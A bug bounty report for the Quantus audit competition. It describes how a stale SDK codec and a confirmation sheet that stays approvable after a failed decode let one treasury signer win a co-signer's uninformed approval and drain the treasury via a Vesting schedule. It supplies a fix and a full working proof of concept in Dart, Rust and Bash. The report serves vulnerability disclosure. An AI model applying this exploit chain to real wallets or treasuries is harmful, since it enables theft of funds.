# 89798 w a high multisig review hides call parameters and enables a treasury drain

**Submitted on Aug 21st 2026 at 08:06:59 UTC by @Paludo0x for** [**Audit Comp | Quantus**](https://immunefi.com/audit-competition/audit-comp-quantus)

* **Report ID:** #89798
* **Report Type:** Websites & Apps
* **Report severity:** High
* **Target:** <https://github.com/immunefi-team/audit-comp-quantus-apps/tree/audit-comp-ready/mobile-app>
* **Impacts:**
  * Malicious interactions with an already-connected wallet, such as:
    * Modifying transaction arguments or parameters
    * Substituting contract addresses
    * Submitting malicious transactions

## Description

## Brief/Intro

Quantus Mobile can let one treasury signer obtain an uninformed second approval and move up to the treasury's spendable balance. Stale SDK metadata and a fail-open multisig review compose into an authority amplification bug. A threshold execution can create an immediately claimable Vesting schedule for the attacker's account.

## Vulnerability Details

Planck configures its treasury as a 2-of-3 multisig. The Mobile application reviews proposals before a signer supplies the approval needed to cross that threshold. Its bundled SDK targets runtime spec 136, while the frozen runtime is spec 143 and assigns Vesting to pallet index 22.

### Step-by-step vulnerability explanation

The bundled `RuntimeCall` codec has no Vesting variant. `RuntimeCall::decode()` throws when it receives the valid live-runtime prefix `22, 1` for `Vesting::create_schedule()`.

```dart
// quantus_sdk/lib/generated/planck/types/quantus_runtime/runtime_call.dart:104
final index = U8Codec.codec.decode(input);
switch (index) {
  // known variants end at index 20
  default:
    throw Exception('RuntimeCall: Invalid variant index: "$index"');
}
```

This mismatch is not cosmetic. Beneficiary, total, start, cliff, and end exist only inside the undecodable call bytes.

The sheet loads authoritative bytes from chain storage. It catches the decode exception and retries `widget.proposal.decodedCall` instead of recording a security failure.

```dart
// mobile-app/lib/v2/screens/multisig/multisig_action_confirm_sheet.dart:185
DecodedCall? get _decodedProposalCall {
  final bytes = _callBytes;
  if (bytes != null) {
    try {
      return CallDecoder.decodeBytes(bytes);
    } catch (e) {
      quantusPrint('${widget.logPrefix} could not decode stored proposal call: $e');
    }
  }
  return widget.proposal.decodedCall;
}
```

That getter uses the same stale codec and returns null. Rendering then falls through to `_fallbackTransferCall`, which contains only the indexer's `Vesting / Create schedule` labels. It contains none of the value-moving parameters.

The approval gate ignores authoritative decode failure. It blocks loading and storage errors, but it does not block `decoded == null`.

```dart
// mobile-app/lib/v2/screens/multisig/multisig_action_confirm_sheet.dart:353
final decoded = _decodedProposalCall;
final blocked = _submitting || _loadingCallBytes || _callBytesFailed;

QuantusButton.simple(
  isDisabled: blocked,
  onTap: blocked ? null : _confirm,
)
```

Local authentication proves user presence, not informed intent. `MultisigActionConfirmSheet::_confirm()` then forwards `_callBytes` unchanged to the approval submitter.

After the second approval, `Multisig::execute()` dispatches as the treasury address. Runtime configuration accepts that signed treasury origin for Vesting administration.

```rust
// runtime/src/configs/mod.rs:603
// The treasury is a multisig in real deployments; the multisig pallet dispatches
// approved proposals as RawOrigin::Signed(multisig_address).
type AdminOrigin = EitherOfDiverse<EnsureRoot<AccountId>, EnsureTreasury>;
```

`Vesting::create_schedule()` transfers `total` from the treasury into the Vesting pot. It stores the attacker as beneficiary.

```rust
// pallets/vesting/src/lib.rs:352
pub fn create_schedule(
    origin: OriginFor<T>,
    beneficiary: T::AccountId,
    start: Moment,
    cliff: Moment,
    end: Moment,
    total: BalanceOf<T>,
) -> DispatchResult {
    T::AdminOrigin::ensure_origin(origin)?;
    T::Currency::transfer(&treasury, &pot, total, Preservation::Preserve)?;
    Schedules::<T>::insert(
        schedule_id,
        VestingSchedule {
            beneficiary: beneficiary.clone(),
            start,
            cliff,
            end,
            total,
            claimed: Zero::zero(),
            last_claim_at: None,
        },
    );
}
```

An immediately matured schedule can then be claimed by any signed account. Payment always goes to the hidden beneficiary.

### Differential from public M3 / PR #575

PR #575 fixed a different necessary root. M3 trusted GraphQL indexer JSON for the reviewed recipient and amount while the approval committed only to a proposal ID. The fix moved the source of truth to the proposal bytes in chain storage and made `approve` resubmit those exact bytes.

This report starts after both controls succeed. The sheet loads the authoritative bytes, and the approval is byte-equal to the stored proposal. No compromised indexer response is required. The residual bypass occurs when the bundled codec cannot decode a valid live-runtime call. Both decode attempts fail, rendering falls through to generic indexer labels instead of the authoritative raw bytes promised by PR #575, and confirmation remains enabled.

The necessary root and minimal fix are therefore different. M3 required authoritative byte sourcing and byte binding; this issue requires fail-closed handling of authoritative decode failure, or an unambiguous raw-byte review, plus runtime-compatible metadata. Applying PR #575 does not automatically fix this issue because its controls are already present in the frozen vulnerable source. This is a bypass of the prior fix, which the competition rules treat as a new valid bug.

### Attack path

{% stepper %}
{% step %}

## One legitimate treasury signer proposes the payload

One legitimate treasury signer calls `Multisig::propose()` with an immediately matured `Vesting::create_schedule()` payload.
{% endstep %}

{% step %}

## The signer cannot execute alone

The runtime rejects `Multisig::execute()`, and treasury state remains unchanged.
{% endstep %}

{% step %}

## An honest co-signer loads the proposal

An honest co-signer opens `MultisigActionConfirmSheet`. It loads the exact stored bytes from the chain.
{% endstep %}

{% step %}

## Decoding fails

`RuntimeCall::decode()` throws on pallet index 22. The sheet shows only generic Vesting labels without parameters.
{% endstep %}

{% step %}

## Approval remains enabled

`MultisigActionConfirmSheet::_confirm()` submits the same hidden bytes after local authentication.
{% endstep %}

{% step %}

## The threshold is crossed

The second approval crosses the 2-of-3 threshold. The malicious signer calls `Multisig::execute()`.
{% endstep %}

{% step %}

## Funds are claimed

The runtime creates the schedule as the treasury multisig. Any signer calls `Vesting::claim()` and pays the attacker.
{% endstep %}
{% endstepper %}

## Impact Details

* Funds at risk: up to the treasury's spendable balance. I do not claim a live treasury balance.
* Demonstrated impact: my local fixture moved 999 of 1,000 QUAN units out of the treasury, then the beneficiary spent 997 QUAN to a separate cash-out account.
* Profitability: after every signed transaction fee, the aggregate attacker-controlled balance increased by `997326360003366` Planck units.
* Authority amplification: one signer may propose, but cannot spend alone. The application defect supplies the missing informed threshold approval.
* Victims: the treasury and honest co-signers whose approval intent does not match the concealed parameters.
* Recovery: co-signers can refuse before execution. After a matured claim, ordinary unilateral recovery is unavailable.
* Primary Critical mapping: `Direct theft of user funds`. The beneficiary receives spendable treasury funds and completes a normal signed cash-out transfer.
* Secondary Critical mapping: `Malicious interactions with an already-connected wallet`, including modifying transaction parameters or submitting malicious transactions. The confirmation hides the beneficiary, amount, and vesting times of the call that receives the threshold approval.
* Severity defense: the connected wallet performs the security approval that crosses the treasury threshold and authorizes the value-moving call.
* Permissioned-role limit: the attacker is a legitimate signer, but holds insufficient unilateral authority. My negative control proves that boundary.
* Known issues: retained referendum votes, trusted miner transport, and finite ZK or reward quantization do not cover this root.
* Public-fix differential: M3 required a compromised indexer and unbound proposal semantics. This bypass requires neither; it exploits the distinct decode-failure branch after #575's authoritative load and byte-binding controls succeed.

## Recommended Fix

Treat missing or failed authoritative decoding as a blocking state for every multisig action.

```dart
final decodeFailed = _callBytes != null && _decodedProposalCall == null;
final blocked = _submitting || _loadingCallBytes || _callBytesFailed || decodeFailed;
```

Also bind generated metadata to the live runtime. Never use generic indexer labels for an actionable confirmation after decode failure.

## Proof of Concept

## PoC Explanation

The PoC contains two tests with different roles. Together they prove the application failure and its economic consequence.

* **Flutter application test:** `quantus_2650_app_poc_test.dart` uses Flutter's native widget-test framework and instantiates the production `MultisigActionConfirmSheet`. It loads the live-runtime Vesting bytes, proves the bundled decoder rejects them, and checks that beneficiary, amount, and timing remain hidden. It then presses the real **Yes, Approve** button and captures the unchanged bytes passed to the submission callback.
* **Rust runtime test:** `quantus_multisig_vesting_full_entry_path()` runs inside the Quantus runtime test suite. It feeds the Flutter output through signed ML-DSA-65 `UncheckedExtrinsic` values and `Executive::apply_extrinsic()`. It does not call an internal settlement function directly.
* **Cross-layer runner:** `run_poc_2650.sh` runs Flutter first and passes its captured payload to Rust. It aborts unless the application output exactly matches the call executed by the runtime.

The isolated widget fixture contains no enrolled local wallet, so `LocalAuthService` takes its documented no-enrollment success branch. This does not bypass the vulnerable authorization boundary: production local authentication proves signer presence, while the defect concerns the call parameters shown before that signer approves. The PoC does not claim to bypass biometrics; it proves that successful authentication can authorize parameters the confirmation sheet failed to disclose.

The Rust test first submits two negative controls. A direct signed Vesting call fails the treasury origin check. A proposal with only the malicious signer's approval cannot execute. Both controls traverse signature, nonce, fee, weight, extension, and dispatch checks.

The harmful branch adds the approval captured by Flutter, executes as the treasury, and claims the matured schedule. The beneficiary then signs `Balances::transfer_keep_alive()` to a separate cash-out account. Final assertions prove spendability and positive aggregate profit after all fees.

```
POC_APP_FORWARDED_CALL_HEX=1601a1450ecdbf27ff59cf395aab85931d9f07e140829cb8fa211019d19c8a334e78000000000000000000000000000000000100000000000000007021d0958c03000000000000000000
test quantus_2650_poc::tests::quantus_multisig_vesting_full_entry_path ... ok
POC_TREASURY_BEFORE=1000000000000000
POC_TREASURY_AFTER=1000000000000
POC_CASH_OUT_SPENDABLE=997000000000000
POC_ATTACKER_INITIAL_AGGREGATE=1000000000000000
POC_ATTACKER_FINAL_AGGREGATE=1997326360003366
POC_ATTACKER_NET_PROFIT=997326360003366
test result: ok. 1 passed; 0 failed

00:00 +1: All tests passed!
POC_2650_RESULT=PASS
```

Both tests use frozen competition commits and local execution. I sent no transaction to a public network.

## Running Script

```bash
#!/usr/bin/env bash
set -euo pipefail

CHAIN_COMMIT='3b243b870a5442a6e5f443056f67bbba87d472f5'
APPS_COMMIT='d5fc4d6572ebc2244e95009a33f5da5048935867'

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
OPENKRITT_ROOT="$(cd "$SCRIPT_DIR/../.." && pwd)"

CHAIN_SOURCE="${CHAIN_SOURCE:-$OPENKRITT_ROOT/.data/engine/checkout-cache-persist/scan-29/cache/immunefi-team__audit-comp-quantus-chain@$CHAIN_COMMIT/immunefi-team__audit-comp-quantus-chain}"
APPS_SOURCE="${APPS_SOURCE:-$OPENKRITT_ROOT/.data/engine/checkout-cache-persist/scan-30/cache/immunefi-team__audit-comp-quantus-apps@$APPS_COMMIT/immunefi-team__audit-comp-quantus-apps}"

if [[ -n "${FLUTTER_BIN:-}" ]]; then
  flutter_bin="$FLUTTER_BIN"
elif command -v flutter >/dev/null 2>&1; then
  flutter_bin="$(command -v flutter)"
elif [[ -x /tmp/quantus2650-flutter/flutter/bin/flutter ]]; then
  flutter_bin='/tmp/quantus2650-flutter/flutter/bin/flutter'
else
  echo 'ERROR: Flutter >=3.32 with Dart >=3.8 is required; set FLUTTER_BIN.' >&2
  exit 2
fi

for source_dir in "$CHAIN_SOURCE" "$APPS_SOURCE"; do
  [[ -d "$source_dir/.git" ]] || { echo "ERROR: frozen source checkout not found: $source_dir" >&2; exit 2; }
done

tmp_dir="$(mktemp -d /tmp/quantus-2650-poc.XXXXXX)"
trap 'rm -rf -- "$tmp_dir"' EXIT

git clone --quiet --shared "$CHAIN_SOURCE" "$tmp_dir/chain"
git -C "$tmp_dir/chain" checkout --quiet --detach "$CHAIN_COMMIT"
[[ "$(git -C "$tmp_dir/chain" rev-parse HEAD)" == "$CHAIN_COMMIT" ]]

git clone --quiet --shared "$APPS_SOURCE" "$tmp_dir/apps"
git -C "$tmp_dir/apps" checkout --quiet --detach "$APPS_COMMIT"
[[ "$(git -C "$tmp_dir/apps" rev-parse HEAD)" == "$APPS_COMMIT" ]]

cp "$SCRIPT_DIR/quantus_2650_app_poc_test.dart" "$tmp_dir/apps/mobile-app/test/quantus_2650_definitive_poc_test.dart"
touch "$tmp_dir/apps/mobile-app/.env"

export PUB_CACHE="${PUB_CACHE:-/tmp/quantus2650-pub-cache}"
expected_call_hex='1601a1450ecdbf27ff59cf395aab85931d9f07e140829cb8fa211019d19c8a334e78000000000000000000000000000000000100000000000000007021d0958c03000000000000000000'
app_log="$tmp_dir/app-poc.log"
(
  cd "$tmp_dir/apps/mobile-app"
  "$flutter_bin" pub get
  "$flutter_bin" test \
    --dart-define="POC_CALL_HEX=$expected_call_hex" \
    test/quantus_2650_definitive_poc_test.dart
) 2>&1 | tee "$app_log"

app_forwarded_hex="$(sed -n 's/.*POC_APP_FORWARDED_CALL_HEX=//p' "$app_log" | tail -n 1)"
[[ -n "$app_forwarded_hex" ]] || { echo 'ERROR: app PoC did not emit forwarded call bytes' >&2; exit 3; }
[[ "$app_forwarded_hex" == "$expected_call_hex" ]] || { echo 'ERROR: app changed the approved call bytes' >&2; exit 3; }

cp "$SCRIPT_DIR/quantus_2650_chain_poc.rs" "$tmp_dir/chain/runtime/tests/quantus_2650_poc.rs"
sed -i '/^mod governance;/a mod quantus_2650_poc;' "$tmp_dir/chain/runtime/tests/mod.rs"

chain_log="$tmp_dir/chain-poc.log"
(
  cd "$tmp_dir/chain"
  POC_APP_APPROVED_CALL_HEX="$app_forwarded_hex" \
  SKIP_WASM_BUILD=1 \
  CARGO_TARGET_DIR="${CARGO_TARGET_DIR:-/tmp/quantus-2650-target}" \
    cargo test -p quantus-runtime --test mod quantus_multisig_vesting_full_entry_path -- --nocapture
) 2>&1 | tee "$chain_log"

net_profit="$(sed -n 's/^POC_ATTACKER_NET_PROFIT=//p' "$chain_log" | tail -n 1)"
cash_out="$(sed -n 's/^POC_CASH_OUT_SPENDABLE=//p' "$chain_log" | tail -n 1)"
[[ -n "$net_profit" && "$net_profit" != '0' ]] || { echo 'ERROR: no positive net profit emitted' >&2; exit 4; }
[[ -n "$cash_out" && "$cash_out" != '0' ]] || { echo 'ERROR: no spendable cash-out emitted' >&2; exit 4; }

echo 'POC_2650_RESULT=PASS'
echo "POC_CHAIN_COMMIT=$CHAIN_COMMIT"
echo "POC_APPS_COMMIT=$APPS_COMMIT"
echo "POC_APP_TO_RUNTIME_HEX=$app_forwarded_hex"
echo "POC_ATTACKER_NET_PROFIT=$net_profit"
echo "POC_CASH_OUT_SPENDABLE=$cash_out"
```

## Flutter POC

```dart
// Candidate 2650 — definitive app-side kill-gate.
//
// POC_CALL_HEX is emitted by quantus_2650_chain_poc.rs. This test proves the
// frozen application receives those exact bytes, cannot decode Vesting index
// 22 with its bundled runtime codec, omits all call fields, yet leaves the
// approval button enabled and forwards the same bytes to submission.

import 'dart:typed_data';

import 'package:convert/convert.dart';
import 'package:flutter/material.dart';
import 'package:flutter_riverpod/flutter_riverpod.dart';
import 'package:flutter_test/flutter_test.dart';
import 'package:quantus_sdk/quantus_sdk.dart';
import 'package:resonance_network_wallet/l10n/app_localizations.dart';
import 'package:resonance_network_wallet/providers/l10n_provider.dart';
import 'package:resonance_network_wallet/providers/wallet_providers.dart';
import 'package:resonance_network_wallet/v2/components/decoded_call_view.dart';
import 'package:resonance_network_wallet/v2/components/quantus_button.dart';
import 'package:resonance_network_wallet/v2/screens/multisig/multisig_action_confirm_sheet.dart';
import 'package:resonance_network_wallet/v2/theme/app_theme.dart';
import 'package:shared_preferences/shared_preferences.dart';

const callHex = String.fromEnvironment('POC_CALL_HEX');

void main() {
  TestWidgetsFlutterBinding.ensureInitialized();

  setUp(() async {
    SharedPreferences.setMockInitialValues({});
    await SettingsService().initialize();
  });

  testWidgets(
    '2650: undecodable authoritative Vesting bytes remain approvable without parameters',
    (tester) async {
      expect(
        callHex,
        isNotEmpty,
        reason: 'run through run_poc_2650.sh so the chain emits POC_CALL_HEX',
      );
      final callBytes = hex.decode(callHex);
      expect(callBytes.take(2), orderedEquals([22, 1]));

      // The frozen SDK codec has no RuntimeCall variant 22.
      expect(
        () => CallDecoder.decodeBytes(callBytes),
        throwsA(isA<Exception>()),
      );

      const honestSigner = Account(
        walletIndex: 0,
        index: 2,
        name: 'Honest treasury signer',
        accountId: 'qz-honest-signer',
      );
      final msig = MultisigAccount(
        name: 'Treasury multisig',
        accountId: 'qz-treasury-multisig',
        signers: ['qz-malicious-signer', 'qz-honest-signer', 'qz-third-signer'],
        threshold: 2,
        nonce: BigInt.zero,
        myMemberAccountId: 'qz-honest-signer',
      );
      final proposal = MultisigProposal(
        entityId: 'poc-2650',
        id: 0,
        multisigAddress: msig.accountId,
        proposer: 'qz-malicious-signer',
        createdAt: DateTime.utc(2026, 8, 20),
        updatedAt: DateTime.utc(2026, 8, 20),
        pallet: 'Vesting',
        call: 'create_schedule',
        recipient: '',
        amount: BigInt.zero,
        callRaw: Uint8List.fromList(callBytes),
        expiryBlock: 100,
        approvals: const ['qz-malicious-signer'],
        deposit: BigInt.zero,
        status: MultisigProposalStatus.active,
        threshold: 2,
        signerCount: 3,
      );
      expect(proposal.decodedCall, isNull);

      List<int>? bytesForwardedToSubmission;
      await tester.pumpWidget(
        ProviderScope(
          overrides: [
            l10nProvider.overrideWithValue(
              lookupAppLocalizations(const Locale('en')),
            ),
            numberFormattingServiceProvider.overrideWithValue(
              NumberFormattingService(
                localeConfig: LocaleNumberConfig.dotDecimal,
              ),
            ),
          ],
          child: MediaQuery(
            data: const MediaQueryData(size: Size(800, 900)),
            child: Builder(
              builder: (context) => MaterialApp(
                theme: AppTheme.darkTheme(context),
                home: Scaffold(
                  body: SingleChildScrollView(
                    child: MultisigActionConfirmSheet(
                      msig: msig,
                      proposal: proposal,
                      signer: honestSigner,
                      logPrefix: '[POC-2650]',
                      hardwareTelemetryPrefix: 'poc_2650',
                      hardwareCacheIdentity: 'poc-2650',
                      labels: MultisigConfirmSheetLabels(
                        title: (_) => 'Are you sure?',
                        body: (_) => 'You are about to approve this proposal',
                        confirmLabel: (_) => 'Yes, Approve',
                        dismissLabel: (_) => 'No',
                        authReason: (_) => 'Authenticate approval',
                        failedMessage: (_) => 'POC stopped after byte capture',
                      ),
                      loadCallBytes: (_) async => List<int>.from(callBytes),
                      estimateFee: (_, __, ___) async => BigInt.zero,
                      buildCall: (_, __) =>
                          throw StateError('hardware path is outside this PoC'),
                      submit: (_, __, ___, submittedBytes) async {
                        bytesForwardedToSubmission = List<int>.from(
                          submittedBytes!,
                        );
                        throw StateError(
                          'stop after capturing the exact approval bytes',
                        );
                      },
                      submitExternal:
                          (
                            _, {
                            required signer,
                            required unsignedData,
                            required signature,
                            required publicKey,
                            fee,
                          }) async {
                            throw StateError(
                              'hardware path is outside this PoC',
                            );
                          },
                    ),
                  ),
                ),
              ),
            ),
          ),
        ),
      );
      await tester.pumpAndSettle();

      // The only visible call information is the generic indexer-derived title.
      expect(find.text('Create schedule'), findsOneWidget);
      expect(find.text('Vesting'), findsOneWidget);
      expect(find.byType(DecodedCallView), findsNothing);
      for (final hiddenField in [
        'Beneficiary',
        'Total',
        'Start',
        'Cliff',
        'End',
      ]) {
        expect(
          find.text(hiddenField),
          findsNothing,
          reason: '$hiddenField must not be shown by the vulnerable sheet',
        );
      }

      final confirmFinder = find.widgetWithText(QuantusButton, 'Yes, Approve');
      expect(confirmFinder, findsOneWidget);
      final confirmButton = tester.widget<QuantusButton>(confirmFinder);
      expect(confirmButton.isDisabled, isFalse);
      expect(confirmButton.onTap, isNotNull);

      // Settings contain no local wallet in this isolated test, so production
      // LocalAuthService takes its documented no-enrolled-wallet success path.
      await tester.tap(confirmFinder);
      await tester.pumpAndSettle();
      expect(bytesForwardedToSubmission, orderedEquals(callBytes));
      // The runner feeds this exact app-emitted value into the runtime test.
      // ignore: avoid_print
      print(
        'POC_APP_FORWARDED_CALL_HEX=${hex.encode(bytesForwardedToSubmission!)}',
      );
      expect(find.text('POC stopped after byte capture'), findsOneWidget);
    },
  );
}
```

## Rust POC

```rust
//! Full-entry-path runtime proof for the Quantus multisig display failure.
//!
//! The Flutter test emits the exact bytes forwarded by the approval sheet.
//! This test consumes those bytes through signed ML-DSA-65 extrinsics and the
//! complete runtime transaction pipeline. It proves the threshold gate,
//! executes the concealed Vesting call, claims the funds, spends them again,
//! and measures the attacker's net profit after runtime and multisig fees.

#[cfg(test)]
mod tests {
    use codec::{Decode, Encode};
    use frame_support::{assert_ok, traits::Currency};
    use pallet_multisig::BoundedCallOf;
    use qp_dilithium_crypto::Dilithium65Pair;
    use quantus_runtime::{
        transaction_extensions::{
            ReversibleTransactionExtension, WormholeProofRecorderExtension,
        },
        AccountId, Balance, Balances, BalancesCall, Executive, Runtime, RuntimeCall,
        Signature, SignedPayload, System, TxExtension, UncheckedExtrinsic, Vesting,
        EXISTENTIAL_DEPOSIT, UNIT, VERSION,
    };
    use sp_core::Pair;
    use sp_runtime::{
        generic::Era,
        traits::IdentifyAccount,
        AccountId32, BuildStorage, MultiAddress, Permill,
    };

    const INITIAL_TREASURY: Balance = 1000 * UNIT;
    const DRAIN: Balance = 999 * UNIT;
    const CASH_OUT: Balance = 997 * UNIT;
    const MATURE_AT_MS: u64 = 1;

    fn pair(seed: u8) -> Dilithium65Pair {
        Dilithium65Pair::from_seed_slice(&[seed; 32]).expect("valid deterministic seed")
    }

    fn account(pair: &Dilithium65Pair) -> AccountId32 {
        pair.public().into_account()
    }

    fn signer_accounts() -> Vec<AccountId> {
        vec![account(&pair(1)), account(&pair(2)), account(&pair(3))]
    }

    fn treasury_multisig() -> AccountId {
        pallet_multisig::Pallet::<Runtime>::derive_multisig_address(&signer_accounts(), 2, 0)
    }

    fn decode_hex(value: &str) -> Vec<u8> {
        assert_eq!(value.len() % 2, 0, "hex input must contain complete bytes");
        value
            .as_bytes()
            .chunks_exact(2)
            .map(|chunk| {
                let text = core::str::from_utf8(chunk).expect("hex must be UTF-8");
                u8::from_str_radix(text, 16).expect("valid hex byte")
            })
            .collect()
    }

    fn signed_call(
        pair: &Dilithium65Pair,
        sender: AccountId32,
        call: RuntimeCall,
        nonce: u32,
    ) -> UncheckedExtrinsic {
        let genesis_hash = System::block_hash(0);
        let tx_ext: TxExtension = (
            frame_system::CheckNonZeroSender::<Runtime>::new(),
            frame_system::CheckSpecVersion::<Runtime>::new(),
            frame_system::CheckTxVersion::<Runtime>::new(),
            frame_system::CheckGenesis::<Runtime>::new(),
            frame_system::CheckEra::<Runtime>::from(Era::immortal()),
            frame_system::CheckNonce::<Runtime>::from(nonce),
            frame_system::CheckWeight::<Runtime>::new(),
            ReversibleTransactionExtension::<Runtime>::new(),
            WormholeProofRecorderExtension::<Runtime>::new(),
            pallet_transaction_payment::ChargeTransactionPayment::<Runtime>::from(0),
            frame_metadata_hash_extension::CheckMetadataHash::<Runtime>::new(false),
            frame_system::WeightReclaim::<Runtime>::new(),
        );
        let raw_payload = SignedPayload::from_raw(
            call.clone(),
            tx_ext.clone(),
            (
                (),
                VERSION.spec_version,
                VERSION.transaction_version,
                genesis_hash,
                genesis_hash,
                (),
                (),
                (),
                (),
                (),
                None,
                (),
            ),
        );
        let signature = raw_payload.using_encoded(|bytes| pair.sign(bytes));
        UncheckedExtrinsic::new_signed(
            call,
            MultiAddress::Id(sender),
            Signature::Dilithium65(signature),
            tx_ext,
        )
    }

    fn apply_ok(pair: &Dilithium65Pair, sender: AccountId32, call: RuntimeCall, nonce: u32) {
        let dispatch = Executive::apply_extrinsic(signed_call(pair, sender, call, nonce))
            .expect("signed extrinsic must pass transaction validity");
        assert_ok!(dispatch);
    }

    fn apply_dispatch_failure(
        pair: &Dilithium65Pair,
        sender: AccountId32,
        call: RuntimeCall,
        nonce: u32,
    ) {
        let dispatch = Executive::apply_extrinsic(signed_call(pair, sender, call, nonce))
            .expect("negative control must still pass signature and transaction validity");
        assert!(dispatch.is_err(), "negative control must fail dispatch");
    }

    fn new_test_ext() -> sp_io::TestExternalities {
        let treasury = treasury_multisig();
        let mut storage = frame_system::GenesisConfig::<Runtime>::default()
            .build_storage()
            .expect("runtime genesis storage");
        pallet_treasury::GenesisConfig::<Runtime> {
            treasury_account: Some(treasury.clone()),
            treasury_portion: Some(Permill::from_percent(50)),
        }
        .assimilate_storage(&mut storage)
        .expect("treasury genesis storage");

        let mut ext = sp_io::TestExternalities::new(storage);
        ext.execute_with(|| {
            System::set_block_number(1);
            for signer in signer_accounts() {
                Balances::make_free_balance_be(&signer, 1000 * UNIT);
            }
            Balances::make_free_balance_be(&treasury, INITIAL_TREASURY);
            Balances::make_free_balance_be(&Vesting::pot_account_id(), EXISTENTIAL_DEPOSIT);
            pallet_timestamp::Now::<Runtime>::put(MATURE_AT_MS);
        });
        ext
    }

    #[test]
    fn quantus_multisig_vesting_full_entry_path() {
        new_test_ext().execute_with(|| {
            let malicious_pair = pair(1);
            let honest_pair = pair(2);
            let third_pair = pair(3);
            let beneficiary_pair = pair(9);
            let malicious = account(&malicious_pair);
            let honest = account(&honest_pair);
            let third = account(&third_pair);
            let beneficiary = account(&beneficiary_pair);
            let cash_out = account(&pair(10));
            let treasury = treasury_multisig();

            let expected_call = RuntimeCall::Vesting(pallet_vesting::Call::create_schedule {
                beneficiary: beneficiary.clone(),
                start: 0,
                cliff: 0,
                end: MATURE_AT_MS,
                total: DRAIN,
            });
            let expected_bytes = expected_call.encode();
            assert_eq!(expected_bytes[0], 22, "Vesting pallet index");
            assert_eq!(expected_bytes[1], 1, "create_schedule call index");

            let app_hex = std::env::var("POC_APP_APPROVED_CALL_HEX")
                .expect("runner must provide bytes emitted by the Flutter approval test");
            let app_bytes = decode_hex(&app_hex);
            assert_eq!(
                app_bytes, expected_bytes,
                "the app-approved bytes must equal the runtime's real encoded call"
            );
            let decoded = RuntimeCall::decode(&mut &app_bytes[..])
                .expect("app-approved bytes must decode in the live runtime");
            assert_eq!(decoded.encode(), app_bytes);
            let bounded: BoundedCallOf<Runtime> =
                app_bytes.clone().try_into().expect("call fits production bound");

            let attacker_initial = Balances::free_balance(&malicious)
                + Balances::free_balance(&beneficiary)
                + Balances::free_balance(&cash_out);

            // Control 1: this signed extrinsic clears signature, nonce, fee,
            // weight and extension checks, then fails the Treasury origin.
            apply_dispatch_failure(&malicious_pair, malicious.clone(), decoded.clone(), 0);
            assert_eq!(Balances::free_balance(&treasury), INITIAL_TREASURY);
            assert!(pallet_vesting::Schedules::<Runtime>::get(0).is_none());

            apply_ok(
                &malicious_pair,
                malicious.clone(),
                RuntimeCall::Multisig(pallet_multisig::Call::create_multisig {
                    signers: signer_accounts(),
                    threshold: 2,
                    nonce: 0,
                }),
                1,
            );
            apply_ok(
                &malicious_pair,
                malicious.clone(),
                RuntimeCall::Multisig(pallet_multisig::Call::propose {
                    multisig_address: treasury.clone(),
                    call: bounded.clone(),
                    expiry: System::block_number() + 100,
                }),
                2,
            );

            // Control 2: the proposer has one approval and cannot execute alone.
            apply_dispatch_failure(
                &malicious_pair,
                malicious.clone(),
                RuntimeCall::Multisig(pallet_multisig::Call::execute {
                    multisig_address: treasury.clone(),
                    proposal_id: 0,
                }),
                3,
            );
            assert_eq!(Balances::free_balance(&treasury), INITIAL_TREASURY);
            assert!(pallet_vesting::Schedules::<Runtime>::get(0).is_none());

            // Harmful branch: the honest signer approves the exact bytes emitted by
            // the real Flutter sheet. Runtime CallMismatch and threshold checks run.
            apply_ok(
                &honest_pair,
                honest,
                RuntimeCall::Multisig(pallet_multisig::Call::approve {
                    multisig_address: treasury.clone(),
                    proposal_id: 0,
                    call: bounded,
                }),
                0,
            );
            apply_ok(
                &malicious_pair,
                malicious.clone(),
                RuntimeCall::Multisig(pallet_multisig::Call::execute {
                    multisig_address: treasury.clone(),
                    proposal_id: 0,
                }),
                4,
            );

            let schedule = pallet_vesting::Schedules::<Runtime>::get(0)
                .expect("multisig execution must create the schedule");
            assert_eq!(schedule.beneficiary, beneficiary);
            assert_eq!(schedule.total, DRAIN);
            assert_eq!(Balances::free_balance(&treasury), INITIAL_TREASURY - DRAIN);

            apply_ok(
                &third_pair,
                third,
                RuntimeCall::Vesting(pallet_vesting::Call::claim { schedule_id: 0 }),
                0,
            );
            assert_eq!(Balances::free_balance(&beneficiary), DRAIN);

            // Spendability control: the beneficiary signs a normal transfer through
            // the complete transaction pipeline and moves most proceeds onward.
            apply_ok(
                &beneficiary_pair,
                beneficiary.clone(),
                RuntimeCall::Balances(BalancesCall::transfer_keep_alive {
                    dest: MultiAddress::Id(cash_out.clone()),
                    value: CASH_OUT,
                }),
                0,
            );
            assert_eq!(Balances::free_balance(&cash_out), CASH_OUT);

            let attacker_final = Balances::free_balance(&malicious)
                + Balances::free_balance(&beneficiary)
                + Balances::free_balance(&cash_out);
            let net_profit = attacker_final
                .checked_sub(attacker_initial)
                .expect("attack must end with positive aggregate attacker profit");
            assert!(net_profit > 0, "attack must remain profitable after every charged fee");

            println!("POC_APP_TO_RUNTIME_HEX={app_hex}");
            println!("POC_TREASURY_BEFORE={INITIAL_TREASURY}");
            println!("POC_TREASURY_AFTER={}", Balances::free_balance(&treasury));
            println!("POC_CASH_OUT_SPENDABLE={}", Balances::free_balance(&cash_out));
            println!("POC_ATTACKER_INITIAL_AGGREGATE={attacker_initial}");
            println!("POC_ATTACKER_FINAL_AGGREGATE={attacker_final}");
            println!("POC_ATTACKER_NET_PROFIT={net_profit}");
        });
    }
}
```
